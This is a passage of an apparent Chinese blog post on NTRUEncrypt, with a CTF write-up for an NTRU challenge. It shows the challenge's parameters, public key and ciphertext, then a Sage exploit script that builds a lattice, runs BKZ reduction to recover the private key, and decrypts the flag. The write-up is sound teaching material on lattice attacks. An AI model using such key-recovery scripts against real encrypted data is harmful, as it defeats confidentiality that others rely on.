T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_powerof2</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> q.is_power_of(<span class=\"number\">2</span>)</span><br><span class=\"line\">    g = inv_mod_prime(f,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        r = bal_mod(mul(g,f),q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r == <span class=\"number\">1</span>: <span class=\"keyword\">return</span> g</span><br><span class=\"line\">        g = bal_mod(mul(g,<span class=\"number\">2</span> - r),q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">keygen</span>():</span><br><span class=\"line\">    f = random_poly(Df)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            fp = inv_mod_prime(f,p)</span><br><span class=\"line\">            fq = inv_mod_powerof2(f,q)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            f = random_poly(Df)</span><br><span class=\"line\">    g = random_poly(Dg)</span><br><span class=\"line\">    h = bal_mod(p * mul(fq,g),q)</span><br><span class=\"line\">    pub_key = h</span><br><span class=\"line\">    pri_key = [f,fp]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pub_key,pri_key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">m,h</span>):</span><br><span class=\"line\">    r = random_poly(Dr)</span><br><span class=\"line\">    e = bal_mod(mul(h,r) + m,q)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    pub_key,pri_key = keygen()</span><br><span class=\"line\">    flag=<span class=\"string\">b&#x27;SCTF&#123;***********&#125;&#x27;</span>[<span class=\"number\">5</span>:-<span class=\"number\">1</span>]</span><br><span class=\"line\">    m = Zx(<span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(b16encode(flag), <span class=\"number\">16</span>))[<span class=\"number\">2</span>:]))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">    e = encrypt(m,pub_key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pub_key=&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(pub_key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;e=&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"><span class=\"comment\"># pub_key=</span></span><br><span class=\"line\"><span class=\"comment\"># 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248</span></span><br><span class=\"line\"><span class=\"comment\"># e=</span></span><br><span class=\"line\"><span class=\"comment\"># -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852</span></span><br></pre></td></tr></table></figure>\n\n<p>显然函数和上面的基本一样，只是名称相应地缩短了一下。<br>攻击方法是构造如下的一个格，然后进行规约<br>$$<br>\\left(<br>\\begin{array}{cccc|cccc}<br>\\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\\\<br>0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q<br>\\end{array}<br>\\right)<br>$$<br>具体可以参考这篇 Paper: <a href=\"https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&amp;rep=rep1&amp;type=pdf\">https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&amp;rep=rep1&amp;type=pdf</a><br>取 $\\lambda=1$ ，规约后最短向量即为 $[f\\enspace g]$ ，然后就可以计算私钥解密了。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">start = time.time()</span><br><span class=\"line\">Zx.&lt;x&gt; = ZZ[]</span><br><span class=\"line\">n = <span class=\"number\">109</span> </span><br><span class=\"line\">q = <span class=\"number\">2048</span></span><br><span class=\"line\">p = <span class=\"number\">3</span></span><br><span class=\"line\">Df = <span class=\"number\">9</span></span><br><span class=\"line\">Dg = <span class=\"number\">10</span></span><br><span class=\"line\">Dr = <span class=\"number\">11</span></span><br><span class=\"line\">h=<span class=\"number\">510</span>*x^<span class=\"number\">108</span> - <span class=\"number\">840</span>*x^<span class=\"number\">107</span> - <span class=\"number\">926</span>*x^<span class=\"number\">106</span> - <span class=\"number\">717</span>*x^<span class=\"number\">105</span> - <span class=\"number\">374</span>*x^<span class=\"number\">104</span> - <span class=\"number\">986</span>*x^<span class=\"number\">103</span> + <span class=\"number\">488</span>*x^<span class=\"number\">102</span> + <span class=\"number\">119</span>*x^<span class=\"number\">101</span> - <span class=\"number\">247</span>*x^<span class=\"number\">100</span> + <span class=\"number\">34</span>*x^<span class=\"number\">99</span> + <span class=\"number\">751</span>*x^<span class=\"number\">98</span> - <span class=\"number\">44</span>*x^<span class=\"number\">97</span> - <span class=\"number\">257</span>*x^<span class=\"number\">96</span> - <span class=\"number\">749</span>*x^<span class=\"number\">95</span> + <span class=\"number\">648</span>*x^<span class=\"number\">94</span> - <span class=\"number\">280</span>*x^<span class=\"number\">93</span> - <span class=\"number\">585</span>*x^<span class=\"number\">92</span> - <span class=\"number\">347</span>*x^<span class=\"number\">91</span> + <span class=\"number\">357</span>*x^<span class=\"number\">90</span> - <span class=\"number\">451</span>*x^<span class=\"number\">89</span> - <span class=\"number\">15</span>*x^<span class=\"number\">88</span> + <span class=\"number\">638</span>*x^<span class=\"number\">87</span> - <span class=\"number\">624</span>*x^<span class=\"number\">86</span> - <span class=\"number\">458</span>*x^<span class=\"number\">85</span> + <span class=\"number\">216</span>*x^<span class=\"number\">84</span> + <span class=\"number\">36</span>*x^<span class=\"number\">83</span> - <span class=\"number\">199</span>*x^<span class=\"number\">82</span> - <span class=\"number\">655</span>*x^<span class=\"number\">81</span> + <span class=\"number\">258</span>*x^<span class=\"number\">80</span> + <span class=\"number\">845</span>*x^<span class=\"number\">79</span> + <span class=\"number\">490</span>*x^<span class=\"number\">78</span> - <span class=\"number\">272</span>*x^<span class=\"number\">77</span> + <span class=\"number\">279</span>*x^<span class=\"number\">76</span> + <span class=\"number\">101</span>*x^<span class=\"number\">75</span> - <span class=\"number\">580</span>*x^<span class=\"number\">74</span> - <span class=\"number\">461</span>*x^<span class=\"number\">73</span> - <span class=\"number\">614</span>*x^<span class=\"number\">72</span> - <span class=\"number\">171</span>*x^<span class=\"number\">71</span> - <span class=\"number\">1012</span>*x^<span class=\"number\">70</span> + <span class=\"number\">71</span>*x^<span class=\"number\">69</span> - <span class=\"number\">579</span>*x^<span class=\"number\">68</span> + <span class=\"number\">290</span>*x^<span class=\"number\">67</span> + <span class=\"number\">597</span>*x^<span class=\"number\">66</span> + <span class=\"number\">841</span>*x^<span class=\"number\">65</span> + <span class=\"number\">35</span>*x^<span class=\"number\">64</span> - <span class=\"number\">545</span>*x^<span class=\"number\">63</span> + <span class=\"number\">575</span>*x^<span class=\"number\">62</span> - <span class=\"number\">665</span>*x^<span class=\"number\">61</span> + <span class=\"number\">304</span>*x^<span class=\"number\">60</span> - <span class=\"number\">900</span>*x^<span class=\"number\">59</span> + <span class=\"number\">428</span>*x^<span class=\"number\">58</span> - <span class=\"number\">992</span>*x^<span class=\"number\">57</span> - <span class=\"number\">241</span>*x^<span class=\"number\">56</span> + <span class=\"number\">953</span>*x^<span class=\"number\">55</span> - <span class=\"number\">784</span>*x^<span class=\"number\">54</span> - <span class=\"number\">730</span>*x^<span class=\"number\">53</span> - <span class=\"number\">317</span>*x^<span class=\"number\">52</span> + <span class=\"number\">108</span>*x^<span class=\"number\">51</span> + <span class=\"number\">180</span>*x^<span class=\"number\">50</span> - <span class=\"number\">881</span>*x^<span class=\"number\">49</span> - <span class=\"number\">943</span>*x^<span class=\"number\">48</span> + <span class=\"number\">413</span>*x^<span class=\"number\">47</span> - <span class=\"number\">898</span>*x^<span class=\"number\">46</span> + <span class=\"number\">453</span>*x^<span class=\"number\">45</span> - <span class=\"number\">407</span>*x^<span class=\"number\">44</span> + <span class=\"number\">153</span>*x^<span class=\"number\">43</span> - <span class=\"number\">932</span>*x^<span class=\"number\">42</span> + <span class=\"number\">262</span>*x^<span class=\"number\">41</span> + <span class=\"number\">874</span>*x^<span class=\"number\">40</span> - <span class=\"number\">7</span>*x^<span class=\"number\">39</span> - <span class=\"number\">364</span>*x^<span class=\"number\">38</span> + <span class=\"number\">98</span>*x^<span class=\"number\">37</span> - <span class=\"number\">130</span>*x^<span class=\"number\">36</span> + <span class=\"number\">942</span>*x^<span class=\"number\">35</span> - <span class=\"number\">845</span>*x^<span class=\"number\">34</span> - <span class=\"number\">890</span>*x^<span class=\"number\">33</span> + <span class=\"number\">558</span>*x^<span class=\"number\">32</span> - <span class=\"number\">791</span>*x^<span class=\"number\">31</span> - <span class=\"number\">654</span>*x^<span class=\"number\">30</span> - <span class=\"number\">733</span>*x^<span class=\"number\">29</span> - <span class=\"number\">171</span>*x^<span class=\"number\">28</span> - <span class=\"number\">182</span>*x^<span class=\"number\">27</span> + <span class=\"number\">644</span>*x^<span class=\"number\">26</span> - <span class=\"number\">18</span>*x^<span class=\"number\">25</span> + <span class=\"number\">776</span>*x^<span class=\"number\">24</span> + <span class=\"number\">845</span>*x^<span class=\"number\">23</span> - <span class=\"number\">675</span>*x^<span class=\"number\">22</span> - <span class=\"number\">741</span>*x^<span class=\"number\">21</span> - <span class=\"number\">352</span>*x^<span class=\"number\">20</span> - <span class=\"number\">143</span>*x^<span class=\"number\">19</span> - <span class=\"number\">351</span>*x^<span class=\"number\">18</span> - <span class=\"number\">158</span>*x^<span class=\"number\">17</span> + <span class=\"number\">671</span>*x^<span class=\"number\">16</span> + <span class=\"number\">609</span>*x^<span class=\"number\">15</span> - <span class=\"number\">34</span>*x^<span class=\"number\">14</span> + <span class=\"number\">811</span>*x^<span class=\"number\">13</span> - <span class=\"number\">674</span>*x^<span class=\"number\">12</span> + <span class=\"number\">595</span>*x^<span class=\"number\">11</span> - <span class=\"number\">1005</span>*x^<span class=\"number\">10</span> + <span class=\"number\">855</span>*x^<span class=\"number\">9</span> + <span class=\"number\">831</span>*x^<span class=\"number\">8</span> + <span class=\"number\">768</span>*x^<span class=\"number\">7</span> + <span class=\"number\">133</span>*x^<span class=\"number\">6</span> - <span class=\"number\">436</span>*x^<span class=\"number\">5</span> + <span class=\"number\">1016</span>*x^<span class=\"number\">4</span> + <span class=\"number\">403</span>*x^<span class=\"number\">3</span> + <span class=\"number\">904</span>*x^<span class=\"number\">2</span> + <span class=\"number\">874</span>*x + <span class=\"number\">248</span></span><br><span class=\"line\">e=-<span class=\"number\">453</span>*x^<span class=\"number\">108</span> - <span class=\"number\">304</span>*x^<span class=\"number\">107</span> - <span class=\"number\">380</span>*x^<span class=\"number\">106</span> - <span class=\"number\">7</span>*x^<span class=\"number\">105</span> - <span class=\"number\">657</span>*x^<span class=\"number\">104</span> - <span class=\"number\">988</span>*x^<span class=\"number\">103</span> + <span class=\"number\">219</span>*x^<span class=\"number\">102</span> - <span class=\"number\">167</span>*x^<span class=\"number\">101</span> - <span class=\"number\">473</span>*x^<span class=\"number\">100</span> + <span class=\"number\">63</span>*x^<span class=\"number\">99</span> - <span class=\"number\">60</span>*x^<span class=\"number\">98</span> + <span class=\"number\">1014</span>*x^<span class=\"number\">97</span> - <span class=\"number\">874</span>*x^<span class=\"number\">96</span> - <span class=\"number\">846</span>*x^<span class=\"number\">95</span> + <span class=\"number\">604</span>*x^<span class=\"number\">94</span> - <span class=\"number\">649</span>*x^<span class=\"number\">93</span> + <span class=\"number\">18</span>*x^<span class=\"number\">92</span> - <span class=\"number\">458</span>*x^<span class=\"number\">91</span> + <span class=\"number\">689</span>*x^<span class=\"number\">90</span> + <span class=\"number\">80</span>*x^<span class=\"number\">89</span> - <span class=\"number\">439</span>*x^<span class=\"number\">88</span> + <span class=\"number\">968</span>*x^<span class=\"number\">87</span> - <span class=\"number\">834</span>*x^<span class=\"number\">86</span> - <span class=\"number\">967</span>*x^<span class=\"number\">85</span> - <span class=\"number\">784</span>*x^<span class=\"number\">84</span> + <span class=\"number\">496</span>*x^<span class=\"number\">83</span> - <span class=\"number\">883</span>*x^<span class=\"number\">82</span> + <span class=\"number\">971</span>*x^<span class=\"number\">81</span> - <span class=\"number\">242</span>*x^<span class=\"number\">80</span> + <span class=\"number\">956</span>*x^<span class=\"number\">79</span> - <span class=\"number\">832</span>*x^<span class=\"number\">78</span> - <span class=\"number\">587</span>*x^<span class=\"number\">77</span> + <span class=\"number\">525</span>*x^<span class=\"number\">76</span> + <span class=\"number\">87</span>*x^<span class=\"number\">75</span> + <span class=\"number\">464</span>*x^<span class=\"number\">74</span> + <span class=\"number\">661</span>*x^<span class=\"number\">73</span> - <span class=\"number\">36</span>*x^<span class=\"number\">72</span> - <span class=\"number\">14</span>*x^<span class=\"number\">71</span> + <span class=\"number\">940</span>*x^<span class=\"number\">70</span> - <span class=\"number\">16</span>*x^<span class=\"number\">69</span> - <span class=\"number\">277</span>*x^<span class=\"number\">68</span> + <span class=\"number\">899</span>*x^<span class=\"number\">67</span> - <span class=\"number\">390</span>*x^<span class=\"number\">66</span> + <span class=\"number\">441</span>*x^<span class=\"number\">65</span> + <span class=\"number\">246</span>*x^<span class=\"number\">64</span> + <span class=\"number\">267</span>*x^<span class=\"number\">63</span> - <span class=\"number\">395</span>*x^<span class=\"number\">62</span> + <span class=\"number\">185</span>*x^<span class=\"number\">61</span> + <span class=\"number\">221</span>*x^<span class=\"number\">60</span> + <span class=\"number\">466</span>*x^<span class=\"number\">59</span> + <span class=\"number\">249</span>*x^<span class=\"number\">58</span> + <span class=\"number\">813</span>*x^<span class=\"number\">57</span> + <span class=\"number\">116</span>*x^<span class=\"number\">56</span> - <span class=\"number\">100</span>*x^<span class=\"number\">55</span> + <span class=\"number\">109</span>*x^<span class=\"number\">54</span> + <span class=\"number\">579</span>*x^<span class=\"number\">53</span> + <span class=\"number\">151</span>*x^<span class=\"number\">52</span> + <span class=\"number\">194</span>*x^<span class=\"number\">51</span> + <span class=\"number\">364</span>*x^<span class=\"number\">50</span> - <span class=\"number\">413</span>*x^<span class=\"number\">49</span> + <span class=\"number\">614</span>*x^<span class=\"number\">48</span> + <span class=\"number\">367</span>*x^<span class=\"number\">47</span> + <span class=\"number\">758</span>*x^<span class=\"number\">46</span> + <span class=\"number\">460</span>*x^<span class=\"number\">45</span> + <span class=\"number\">162</span>*x^<span class=\"number\">44</span> + <span class=\"number\">837</span>*x^<span class=\"number\">43</span> + <span class=\"number\">903</span>*x^<span class=\"number\">42</span> + <span class=\"number\">896</span>*x^<span class=\"number\">41</span> - <span class=\"number\">747</span>*x^<span class=\"number\">40</span> + <span class=\"number\">410</span>*x^<span class=\"number\">39</span> - <span class=\"number\">928</span>*x^<span class=\"number\">38</span> - <span class=\"number\">230</span>*x^<span class=\"number\">37</span> + <span class=\"number\">465</span>*x^<span class=\"number\">36</span> - <span class=\"number\">496</span>*x^<span class=\"number\">35</span> - <span class=\"number\">568</span>*x^<span class=\"number\">34</span> + <span class=\"number\">30</span>*x^<span class=\"number\">33</span> - <span class=\"number\">158</span>*x^<span class=\"number\">32</span> + <span class=\"number\">687</span>*x^<span class=\"number\">31</span> - <span class=\"number\">284</span>*x^<span class=\"number\">30</span> + <span class=\"number\">794</span>*x^<span class=\"number\">29</span> - <span class=\"number\">606</span>*x^<span class=\"number\">28</span> + <span class=\"number\">705</span>*x^<span class=\"number\">27</span> - <span class=\"number\">37</span>*x^<span class=\"number\">26</span> + <span class=\"number\">926</span>*x^<span class=\"number\">25</span> - <span class=\"number\">602</span>*x^<span class=\"number\">24</span> - <span class=\"number\">442</span>*x^<span class=\"number\">23</span> - <span class=\"number\">523</span>*x^<span class=\"number\">22</span> - <span class=\"number\">260</span>*x^<span class=\"number\">21</span> + <span class=\"number\">530</span>*x^<span class=\"number\">20</span> - <span class=\"number\">796</span>*x^<span class=\"number\">19</span> + <span class=\"number\">443</span>*x^<span class=\"number\">18</span> + <span class=\"number\">902</span>*x^<span class=\"number\">17</span> - <span class=\"number\">210</span>*x^<span class=\"number\">16</span> + <span class=\"number\">926</span>*x^<span class=\"number\">15</span> + <span class=\"number\">785</span>*x^<span class=\"number\">14</span> + <span class=\"number\">440</span>*x^<span class=\"number\">13</span> - <span class=\"number\">572</span>*x^<span class=\"number\">12</span> - <span class=\"number\">268</span>*x^<span class=\"number\">11</span> - <span class=\"number\">217</span>*x^<span class=\"number\">10</span> + <span class=\"number\">26</span>*x^<span class=\"number\">9</span> + <span class=\"number\">866</span>*x^<span class=\"number\">8</span> + <span class=\"number\">19</span>*x^<span class=\"number\">7</span> + <span class=\"number\">778</span>*x^<span class=\"number\">6</span> + <span class=\"number\">923</span>*x^<span class=\"number\">5</span> - <span class=\"number\">197</span>*x^<span class=\"number\">4</span> - <span class=\"number\">446</span>*x^<span class=\"number\">3</span> - <span class=\"number\">202</span>*x^<span class=\"number\">2</span> - <span class=\"number\">353</span>*x - <span class=\"number\">852</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">pri_key,e</span>):</span><br><span class=\"line\">    f,fp = pri_key</span><br><span class=\"line\">    a = bal_mod(mul(f,e),q)</span><br><span class=\"line\">    b = bal_mod(mul(a,fp),p)</span><br><span class=\"line\">    pt = <span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> b.<span class=\"built_in\">list</span>()])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pt</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bal_mod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lattice</span>(<span class=\"params\">h,q</span>):</span><br><span class=\"line\">    n = <span class=\"number\">109</span></span><br><span class=\"line\">    <span class=\"comment\"># h = bal_mod(683*h,q)</span></span><br><span class=\"line\">    grid = Matrix(ZZ,<span class=\"number\">2</span>*n,<span class=\"number\">2</span>*n)</span><br><span class=\"line\">    cof = h.<span class=\"built_in\">list</span>()</span><br><span class=\"line\">    offset = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>*n):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>*n):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i&lt;n:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> j &lt; n:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i==j:</span><br><span class=\"line\">                        grid[i,j] = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    grid[i,j] = cof[(j-n-offset)%n]</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> j&gt;=n <span class=\"keyword\">and</span> i==j:</span><br><span class=\"line\">                grid[i,j] = q</span><br><span class=\"line\">        offset += <span class=\"number\">1</span></span><br><span class=\"line\">    GL = grid.BKZ()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> GL,grid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_prime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\">GL,grid = lattice(h,q)</span><br><span class=\"line\">SVP = <span class=\"built_in\">list</span>(GL[<span class=\"number\">0</span>])</span><br><span class=\"line\">f = Zx(SVP[:n])</span><br><span class=\"line\">g = Zx(SVP[-n:])</span><br><span class=\"line\">a = bal_mod(mul(f,e),q)</span><br><span class=\"line\">fp = inv_mod_prime(f,p)</span><br><span class=\"line\">pv = (f,fp)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(decrypt(pv,e))</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(decrypt(pv,e)+<span class=\"string\">&#x27;0&#x27;</span>*<span class=\"number\">6</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(flag))</span><br><span class=\"line\"></span><br><span class=\"line\">end = time.time()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(end-start)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"勘误\"><a href=\"#勘误\" class=\"headerlink\" title=\"勘误\"></a>勘误</h2><p>维基百科中说 $m$ 转化成系数在 $[-p/2,p/2]$ 间多项式，实际应为 ${-1,0,1}$ 间。<br>代码中加密函数原为<code>return balancedmod(convolution(public_key,p*r) + message,q)</code>，一般版本中的公钥是没乘 $p$ 的，在加密中才乘，但这里公钥已经乘过 $p$ 了，就可以删去。实测不删去也可正常解密，推测应该是在后面取模时消去了，读者可自行推导。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://en.wikipedia.org/wiki/NTRUEncrypt\">https://en.wikipedia.org/wiki/NTRUEncrypt</a><br><a href=\"https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage\">https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage</a><br><a href=\"https://blog.csdn.net/sinat_36742186/article/details/83689529\">https://blog.csdn.net/sinat_36742186/article/details/83689529</a></p>\n","excerpt":"<p>NTRUEncrypt 公钥加密系统</p>","more":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>这里基本摘自维基百科，少少枯燥，可以自行选择略读。</p>\n<p>NTRUEncrypt 是一个公钥加密系统，它的安全性基于这样一个问题的困难性：在一个截断多项式环（这个翻译怪怪的）中<strong>将一个给定的多项式分解成两个系数非常小的多项式的商</strong>。<br>由于加密与解密都只涉及简单的多项式乘法，故相比于其他的加密系统， NTRUEncrypt 的<strong>效率会更高</strong>。<br>具体来说， NTRU 的操作基于截断多项式环中的对象 ${\\displaystyle \\ R=\\mathbb {Z} [X]/(X^{N}-1)}$ 